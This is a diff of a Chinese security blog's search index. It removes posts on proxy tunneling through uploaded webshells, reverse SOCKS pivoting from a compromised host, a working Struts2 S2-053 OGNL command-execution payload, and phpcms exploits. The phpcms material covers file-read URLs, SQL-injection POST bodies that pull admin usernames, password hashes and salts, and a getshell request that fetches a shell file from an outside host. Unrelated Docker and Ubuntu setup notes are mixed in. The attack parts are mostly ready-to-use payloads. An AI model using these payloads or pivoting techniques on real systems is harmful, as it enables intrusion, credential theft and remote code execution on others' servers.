-    <content type="text"><![CDATA[如题 脚本代理工具使用总结理论：正向代理和反向代理 正向：我们发起请求，连接远程目标 反向：远程目标发起请求，绕过防火墙，连接我们的攻击机（需要有公网IP、端口） web脚本工具：reDuh（鼻祖，不太好用）使用方法： 内有客户端和服务端两个版本。先将服务端的文件上传到服务器上，尝试访问并记录链接。访问链接如上图则表明成功。然后打开客户端，将记录的链接放入，写入进行转发的端口号和要连接的目标机的IP（此时认为自己站在服务器上，如果输入127.0.0.1，则是连接服务器的某个端口），先点击start，然后点击Create。会将端口映射到自己电脑的指定端口。然后使用相应的程序连接自己本地的端口即可 tunna（不太好用）使用方法： 将webshells中的conn文件上传到服务器，访问文件如果是一片空格则证明成功了。 攻击机使用命令： python proxy.py -u 连接网址 -l 本地端口 -r 目标端口 -a 127.0.0.1 例：1python proxy.py -u http://192.168.20.54/uploads/scanGE/conn.php -l 2222 -r 3389 -a 192.168.5.136 则连接本地的2222相当于连接内网192.168.5.136的3389如果此时映射3389（假设对方不允许远程登录），则也可以成功连接。 如果只监听自己的2222，不指定对方端口，则需要配合代理软件（例如shadowsocks需要使用firefox的代理来配合） reGeorg+proxifier（或sc32.exe）（目前最好用的）原理： Proxifier可以让指定程序的流量全部走指定的端口，而reGeorgSocksProxy脚本可以将服务器映射到本地监听端口，则所有通过本地监听端口的流量就相当于是走了服务器，所以可以访问到服务器内网 使用方法： 将tunnel文件上传的服务器，访问文件网址，出现下图则证明成功攻击机上执行： python reGeorgSocksProxy -u 木马网址 -p 本地监听端口 例：1python reGeorgSocksProxy.py -u http://192.168.20.54/uploads/scanGE/tunnel.php -p 1234 使用Proxifier工具进行端口代理 打开proxifier端口代理工具——》Profile——》proxy Servers 添加一个 127.0.0.1 本地监听端口号 socket 5Proxifier——》Proxification Rules——》添加对应的程序（例如3389用mstsc）——》下面action选择刚刚添加的代理——》Target Ports 输入目标IP和端口（此时认为自己是服务器，如果是扫描器则不能输入IP和端口）——》打上对勾——》OK——》（如果不好用，可以指定端口和IP尝试一下）此时再使用刚刚选择的程序，则那个程序全部走指定流量，例如使用mstsc，输入内网机IP（此时自己站在服务器的视角），即可成功连接 也可以直接加载端口扫描器之类的进行内网扫描不使用Proxifier，也可以使用sc32.exe进行端口代理文件——》设置——》SOCKS设置——》SOCKS版本5——》确定新建——》mstsc.exe——》运行]]></content>
-      <categories>
-        <category>端口转发</category>
-      </categories>
-      <tags>
-        <tag>代理</tag>
-        <tag>端口转发</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[ssocks（RCSOCKS代理工具套装）]]></title>
     <url>%2F2017%2F09%2F13%2Fssocks%2F</url>
     <content type="text"><![CDATA[SSOCKS的使用方法记录 SSOCKS（RCSOCKS代理工具套装）这个工具有两个版本：windows和Linux的，可以混用 Windows的直接使用ssocks-win32即可 Linux的需要先进行编译：./configure make ssocksd 用来开启Socks5代理服务 ssocks 本地启用Socks5服务，并反弹到另一IP地址 rcsocks 接收反弹过来的Socks5服务，并转向另一端口 使用说明：Linux中： 12345攻击机上：./rcsocks -l 10086 -p 10010 -vv肉鸡上：./rssocks -vv -s 攻击机IP:10010kali中自带proxychains端口代理工具/etc/proxychains.conf 进行配置（底部）127.0.0.1 socks5 10086proxychains ssh root@ip（此处的IP假设自己是肉鸡） 然后该软件就会走刚设置的端口 windows则需要在cmd中运行，使用方法同Linux类似]]></content>
@@ -284,32 +155,9 @@
         <category>端口转发</category>
       </categories>
       <tags>
-        <tag>代理</tag>
         <tag>端口转发</tag>
+        <tag>代理</tag>
         <tag>ssocks</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Struts2 Freemarker tags 远程代码执行漏洞(S2-053)环境（转载）]]></title>
-    <url>%2F2017%2F09%2F08%2Fst2-053%2F</url>
-    <content type="text"><![CDATA[使用docker拉取的环境 Struts2 Freemarker tags 远程代码执行漏洞(S2-053)环境（转载）漏洞信息 ● S2-053 公告 获取环境: 1.拉取镜像到本地 1$ docker pull medicean/vulapps:s_struts2_s2-053 2.启动环境 1$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-053 -p 80:8080 前面的 80 代表物理机的端口，可随意指定。 使用与利用 访问 http://你的 IP 地址:端口号/ PoC 1.访问 Demo 页面, 随便输入值，可看到页面输出我们提交的值 2.在输入框中输入 %{100-3}，然后提交，发现 %{} 中的表达式被执行 Exp 命令执行 Exp: 1%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;/usr/bin/touch /tmp/vuln&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; 替换Exp中的 (#cmd=’/usr/bin/touch /tmp/vuln’) 中的命令即可 修复建议 升级Apache struts 至 2.5.12 版本 或者 2.3.34 版本 参考链接 S2-053 公告 S2-053 复现分析过程(附POC) 猎户攻防实验室]]></content>
-      <categories>
-        <category>Struts2</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-        <tag>st-053</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[docker的安装、升级与卸载]]></title>
-    <url>%2F2017%2F09%2F08%2FdockerInstall%2F</url>
-    <content type="text"><![CDATA[如题 安装docker根据官方文档进行的安装配置，以下为copy的官方安装教程。链接：https://docs.docker.com/engine/installation/linux/docker-ce/ubuntu/#recommended-extra-packages-for-trusty-1404 先决条件要安装Docker CE，需要64位版本的这些Ubuntu版本之一（注意，必须是64位）： Zesty 17.04 Xenial 16.04 (LTS) Trusty 14.04 (LTS) Ubuntu on x86_64（或amd64）armhf，和s390x（IBM Z）体系结构支持Docker CE 。s390x限制：IBM Z仅支持Ubuntu Xenial和Zesty。 卸载旧版本 较老版本的Docker被称为docker或docker-engine。如果这些已安装，请卸载它们： 1$ sudo apt-get remove docker docker-engine docker.io Trusty 14.04推荐额外套餐除非你有很强的理由不要安装这些linux-image-extra-*软件包，否则 Docker可以使用aufs存储驱动程序。 12345$ sudo apt-get update$ sudo apt-get install \ linux-image-extra-$(uname -r) \ linux-image-extra-virtual 对于Ubuntu 16.04及更高版本，Linux内核包括对OverlayFS的支持，Docker CE将overlay2默认使用存储驱动程序。 安装Docker CE您可以根据需要以不同的方式安装Docker CE： 大多数用户 设置了Docker的存储库并从中安装，以方便安装和升级任务。这是推荐的方法。 一些用户下载DEB软件包并 手动安装并手动完成升级。这在诸如在没有访问互联网的空中密码系统上安装Docker的情况下是有用的。 在测试和开发环境中，一些用户选择使用自动化 便利脚本来安装Docker。 使用存储库进行安装在新主机上首次安装Docker CE之前，需要设置Docker存储库。之后，您可以从存储库安装和更新Docker。 设置存储库1.更新apt包索引：1$ sudo apt-get update 2.安装软件包以允许apt通过HTTPS使用存储库：12345$ sudo apt-get install \ apt-transport-https \ ca-certificates \ curl \ software-properties-common 3.添加Docker的官方GPG密钥：1$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 验证键指纹是否正确9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88。123456$ sudo apt-key fingerprint 0EBFCD88pub 4096R/0EBFCD88 2017-02-22Key fingerprint = 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88uid Docker Release (CE deb) &lt;docker@docker.com&gt;sub 4096R/F273FCD8 2017-02-22 4.使用以下命令设置稳定版本库。您始终需要稳定的存储库，即使您也想从边缘或测试存储库安装构建 。要添加边缘或 测试库，请在下面的命令中的单词后添加单词edge或test（或两者）stable。 注意：以下1lsb_release -cs 子命令返回您的Ubuntu发行版的名称，例如xenial。 有时候，在像Linux Mint这样的发行版中，您可能需要更改$(lsb_release -cs) 为您的父级Ubuntu发行版。 例如，如果您正在使用 Linux Mint Rafaela，可以使用trusty。 x86_64：1234$ sudo add-apt-repository \ &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable&quot; armhf：1234$ sudo add-apt-repository \ &quot;deb [arch=armhf] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable&quot; s390x：1234$ sudo add-apt-repository \ &quot;deb [arch=s390x] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable&quot; 注意：从Docker 17.06开始，稳定的版本也被推到了边缘，并且测试了存储库。 安装DOCKER CE1.更新apt包索引。1$ sudo apt-get update 2.安装最新版本的Docker CE，或者转到下一步安装特定版本。Docker的任何现有安装都被替换。1$ sudo apt-get install docker-ce 有多个Docker存储库？ 如果启用了多个Docker存储库，则无需在apt-get installor或 apt-get update命令中指定版本即可安装或更新，将始终安装尽可能高的版本，这可能不适合您的稳定性需求。 3.在生产系统上，您应该安装特定版本的Docker CE，而不是始终使用最新版本。此输出被截断。列出可用版本。 123$ apt-cache madison docker-cedocker-ce | 17.06.0~ce-0~ubuntu | https://download.docker.com/linux/ubuntu xenial/stable amd64 Packages 列表的内容取决于启用了哪些存储库。选择要安装的特定版本。第二列是版本字符串。第三列是存储库名称，它指示软件包所在的存储库以及其稳定性级别。要安装特定版本，请将版本字符串附加到包名称，并将其分隔为等号（=）： 1$ sudo apt-get install docker-ce=&lt;VERSION&gt; Docker守护程序自动启动。 4.通过运行hello-world 映像验证Docker CE是否正确安装。 1$ sudo docker run hello-world 或者如果你在armhf上运行：1bash $ sudo docker run armhf/hello-world This command downloads a test image and runs it in a container. When thecontainer runs, it prints an informational message and exits. Docker CE已安装并运行。您需要使用sudo来运行Docker命令。继续执行Linux安装后，允许非特权用户运行Docker命令和其他可选配置步骤。 升级DOCKER CE要升级Docker CE，首先运行1sudo apt-get update 然后按照 安装说明，选择要安装的新版本。 从包装中安装如果您不能使用Docker的存储库来安装Docker CE，则可以下载该.deb版本的 文件并手动安装。每次要升级Docker CE时，都需要下载一个新文件。 1.转到https://download.docker.com/linux/ubuntu/dists/，选择你的Ubuntu版本，浏览pool/stable/和选择amd64， armhf或s390x。下载.deb要安装的Docker版本的文件。 注意：要安装边缘 包，stable请将URL中的单词更改 为edge。 了解稳定和边缘渠道。 2.安装Docker CE，将下面的路径更改为您下载Docker软件包的路径。 1$ sudo dpkg -i /path/to/package.deb Docker守护程序自动启动。 3.通过运行hello-world 映像验证Docker CE是否正确安装。 1$ sudo docker run hello-world 此命令下载测试图像并在容器中运行它。当容器运行时，它打印一条信息消息并退出。Docker CE已安装并运行。您需要使用sudo来运行Docker命令。继续执行Linux的安装后步骤，以允许非特权用户运行Docker命令和其他可选配置步骤。 升级DOCKER CE要升级Docker CE，请下载较新的软件包文件并重复 安装过程，指向新文件。 使用方便脚本进行安装 Docker在get.docker.com 和test.docker.com上提供了方便的脚本，用于将Docker CE的稳定和测试版本快速，非交互式安装到开发环境中。脚本的源代码位于 docker-install存储库中。 不建议在生产环境中使用这些脚本，您应该在使用这些脚本之前了解潜在的风险： 脚本需要root或sudo权限才能运行。因此，在运行脚本之前，应仔细检查和审核脚本。 该脚本尝试检测您的Linux发行版和版本，并为您配置您的软件包管理系统。此外，脚本不允许您自定义任何安装参数。这可能导致不受支持的配置，无论是从Docker的角度还是从您自己的组织的准则和标准。 脚本安装包管理器的所有依赖关系和建议，而不要求确认。这可能会安装大量的软件包，具体取决于您的主机的当前配置。 如果Docker已经使用其他机制安装在主机上，则不要使用便利脚本。 此示例使用get.docker.com上的脚本在Linux上安装最新的Docker CE版本。要安装最新的测试版本，请改用test.docker.com。在下面的每个命令，取代每次出现get用test。 警告： 始终检查从互联网下载的脚本，然后再在本地运行。 123$ curl -fsSL get.docker.com -o get-docker.sh$ sudo sh get-docker.sh If you would like to use Docker as a non-root user, you should now consider adding your user to the “docker” group with something like: 1sudo usermod -aG docker your-user Remember that you will have to log out and back in for this to take effect! WARNING: Adding a user to the “docker” group will grant the ability to run containers which can be used to obtain root privileges on the docker host. Refer to https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface for more information. Docker CE已安装。它DEB基于分布自动启动。在 RPM基于发行，则需要使用适当的手动启动它systemctl或者service命令。消息显示，非root用户默认情况下无法运行Docker命令。 使用方便脚本后升级DOCKER如果您使用便利脚本安装Docker，则应直接使用您的程序包管理器升级Docker。重新运行方便脚本没有任何优势，如果尝试重新添加已经添加到主机的存储库，可能会导致问题。 卸载Docker CE 卸载Docker CE包： 1$ sudo apt-get purge docker-ce 主机上的图像，容器，卷或自定义配置文件不会自动删除。删除所有图像，容器和卷： 1$ sudo rm -rf /var/lib/docker 您必须手动删除任何已编辑的配置文件。]]></content>
-      <categories>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
@@ -368,8 +216,8 @@
         <category>端口转发</category>
       </categories>
       <tags>
-        <tag>代理</tag>
         <tag>端口转发</tag>
+        <tag>代理</tag>
       </tags>
   </entry>
   <entry>
@@ -396,40 +244,6 @@
       <tags>
         <tag>vi</tag>
         <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[phpcms漏洞利用【转载】]]></title>
-    <url>%2F2017%2F08%2F31%2FphpcmsLoopholes%2F</url>
-    <content type="text"><![CDATA[如题所示 phpcms漏洞 最近某位大牛说，将放出3个phpcms的0day漏洞，目前我所了解到的已经有2个phpcms漏洞被流传开来，并放出了poc。phpcms应用范围还是比较广的，在此记录分享一下几个最新的phpcms漏洞。 免责申明：文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负phpcms 任意文件读取漏洞 更新于2017年5月4日漏洞具体细节参考：http://bobao.360.cn/learning/detail/3805.html 漏洞利用方案一：登录普通用户，访问链接：1http://localhost/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&amp;f=p%3%25252%2*70C 获取分配的att_json,然后将这段json值带入到down类的init函数中去： 1http://localhost/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=013ceMuDOmbKROPvvdV0SvY95fzhHTfURBCK4CSbrnbVp0HQOGXTxiHdRp2jM-onG9vE0g5SKVcO_ASqdLoOSsBvN7nFFopz3oZSTo2P7b6N_UB037kehz2lj12lFGtTsPETp-a0mAHXgyjn-tN7cw4nZdk10Mr2g5NM_x215AeqpOF6_mIF7NsXvWiZl35EmQ 方案二：在未登录的情况下访问：1http://localhost/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1 获取当前的siteid,然后再访问: 12http://localhost/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&amp;f=p%3%25252%2*70CPOST_DATA:userid_flash=14e0uml6m504Lbwsd0mKpCe0EocnqxTnbfm4PPLW 修复方案升级至官方最新版本 phpcms sql漏洞Poc存在sql注入漏洞的页面： 1http://192.168.1.139:8080/phpcms/index.php?m=member&amp;c=index&amp;a=login 获取当前数据库，post： 1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bdatabase())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取当前用户，post： 1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取表名：1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2btable_name%2bfrom%2binformation_schema.tables%2bwhere%2btable_schema=&apos;phpcmsv9&apos;%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 若要获取其他表名，修改limit即可。 获取用户名:1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2busername%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取密码1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bpassword%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取到的密码为30位的md5，一般的MD5是32位，所以我们需要再获取后2位：1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(substring((select%2bpassword%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c-2%252c2))%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 phpcms是加盐（salt）的，获取salt:1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bencrypt%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 以上Poc来自：https://www.unhonker.com/bug/1834.html exp漏洞利用脚本exp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/exp脚本可以参考：https://www.waitalone.cn/phpcmsv9-authkey-exp.html漏洞细节请参考：http://mp.weixin.qq.com/s/cI-wbQyX-3WLhxJ5kqez4A 漏洞修复方案去掉modules\content\down.php文件 phpcms注册页面getshell漏洞存在的漏洞：php远程文件包含、任意文件上传 漏洞利用点：phpcms注册页面 利用类型：http post请求导致任意文件上传+getshell Post Poc1siteid=1&amp;modelid=11&amp;username=newbie&amp;password=newbie&amp;email=newbie@qq.com&amp;info[content]=&lt;img src=http://shhdmqz.com/newbie.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol= 注意：http://shhdmqz.com/newbie.txt为远程服务器上的shell文件，这个漏洞利用了远程文件包含与文件上传漏洞。 漏洞利用细节 访问注册页面发送post包，重构info字段内容，写入远程包含的文件地址《img src=http://shhdmqz.com/newbie.txt?.php#.jpg》，newbie.txt为文件名，?.php#.jpg为构造的文件名，为了绕过后缀名限制。回包将会有报错信息，但文件可以上传成功，且报错信息中含有上传的文件路径，可用菜刀链接。 exp漏洞利用脚本exp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/ 漏洞修复方案暂时性修复： 关闭注册页面关闭远程文件包含，即关闭allow_url_fopen 彻底性修复： 12345修改phpcms/libs/classes/attachement.class.php文件中的download函数在foreach($remotefileurls as $k=&gt;$file)循环中，大约是167行左右的位置，将if(strpos($file, &apos;://&apos;) === false || strpos($file, $upload_url) !== false) continue; $filename = fileext($file);修改成$filename = fileext($k); 关于文件包含漏洞，可参考：文件包含漏洞 任意文件读取漏洞1index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=..\/..\/caches/error_log.php phpcms敏感信息1234默认账号密码：phpcms/phpcms默认后台： http://www.xx.com/index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash=会员中心地址：index.php?m=member&amp;c=index&amp;a=login本篇将持续跟踪phpcms最新漏洞状况，并附上检测方法以及修复方案，协助管理员早日修复漏洞，谢谢！ 本文标题:phpcms漏洞文章作者:nMask发布时间:2017年04月12日 - 09:04最后更新:2017年07月25日 - 20:07原始链接:http://thief.one/2017/04/12/1/许可协议: 署名-非商业性使用-禁止演绎 4.0 国际 转载请保留原文链接及作者。]]></content>
-      <categories>
-        <category>漏洞利用</category>
-      </categories>
-      <tags>
-        <tag>-phpcms -漏洞利用</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Ubuntu安装完成可以做的一些事]]></title>
-    <url>%2F2017%2F08%2F29%2FnewUbuntu%2F</url>
-    <content type="text"><![CDATA[如题所示 可以做的有：1、换源根据自己安装的Ubuntu版本，去网上找相应的源，源文件位置：/etc/apt/source.list这里给出Ubuntu14.04搜狐源： 12345678910deb http://mirrors.sohu.com/ubuntu/ trusty main restricted universe multiversedeb http://mirrors.sohu.com/ubuntu/ trusty-security main restricted universe multiversedeb http://mirrors.sohu.com/ubuntu/ trusty-updates main restricted universe multiversedeb http://mirrors.sohu.com/ubuntu/ trusty-proposed main restricted universe multiversedeb http://mirrors.sohu.com/ubuntu/ trusty-backports main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty-security main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty-updates main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty-proposed main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty-backports main restricted universe multiverse 将上面内容复制后，输入1sudo vim /etc/apt/source.list 编辑源文件，在命令行模式下按p进行粘贴，输入:wq回车，进行保存 12sudo apt-get update #更新软件索引列表sudo apt-get upgrade #更新所有软件（不建议） 2、安装SSH、FTP、Telnet（有的系统会自行安装） 先尝试service /etc/init.d/ssh start 或者 cd /etc/init.d 再service ssh start 若是无回显则ssh开启， service ssh status 查看ssh状态 若是出错则sudo apt-get install ssh 进行安装 安装完成后再执行上面的操作 apt-get install vsftpd 安装ftp服务器 3、安装 vmware tools图形化的可以在页面上点击安装vmware-tools进行安装 命令行可以apt-get install open-vm-tools-desktop fuse 4、安装截图工具ksnapshotapt-get install ksnapshot使用命令 ksnapshot-region 可以截屏，将该命令设置为快捷键方别使用 5、重新安装vim1234567891011121314apt-get remove vim-common #删除原版apt-get install vim #安装新版#简单配置VIMvim /etc/vim/vimrc#设置语法高亮:命令行模式下输入/syn 找到 syntax on 这一行，去掉前面的双引号（双引号是注释的意思）添加行号命令行模式下shift+g跳到末尾行，添加新行：set nu自动缩进文本末尾添加一行：set autoindent 自动缩进再添加一行：set cindent 针对C语言自动缩进#设定缩进set tabstop=4 #设定tab键缩进的空格数set shiftwidth=4 #设定编辑器将多少空格视为一个缩进 6、支持Xshell进行上传下载12apt-get install rpmapt-get install lrzsz 7、redis-toolsapt-get install redis-tools 渗透工具安装：123456789101112131415netdiscover 用来嗅探存活主机apt-get netdiscover 安装命令netdiscover -r 192.168.1.0/24 扫描本地网络主机nmap apt-get install nmap whatwebapt-get install whatweb CMS识别hydraapt-get install hydra 密码破解proxychainsapt-get install proxychains 端口代理redsktopapt-get install rdesktop 远程登录windows安装sqlmap/metasploit/wpscan]]></content>
-      <categories>
-        <category>Ubuntu</category>
-      </categories>
-      <tags>
-        <tag>Ubuntu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[windows下解决图片上传的麻烦]]></title>
-    <url>%2F2017%2F08%2F29%2FsolveHexoImage%2F</url>
-    <content type="text"><![CDATA[众所周知，markdown添加图片要先上传，再复制图片链接。这里给出了一种简单的解决办法，可以一步实现上传和生成连接 Hexo_MD + 七牛API+MPic图床神器 注册账号 你要到七牛官网上注册一个七牛个人账号，经过支付宝认证之后可以获得10G的免费储存空间。 创建一个对象储存空间，作为分享图片的仓库创建选项中只需要注意选择公开空间即可，其它的无所谓。 创建结束后检查一下空间的图片保护选项是否关闭，如果没有关闭，就手动关闭一下。 下载软件：Mpic 图床神器。 下载完成后，设置账号——》设置如下图 具体配置： 七牛空间名就是创建的空间名称 AccessKey和SecretKey在个人中心可以看到，复制进来 域名是创建的空间的域名 设置完成后，需要上传图片的时候，打开软件，复制或者截图就会自动上传并生成图片链接了（在屏幕右下角有程序图标，右键可以开启或关闭自动上传功能）]]></content>
-      <categories>
-        <category>markdown</category>
-      </categories>
-      <tags>
-        <tag>markdown</tag>
-        <tag>图床</tag>
       </tags>
   </entry>
   <entry>
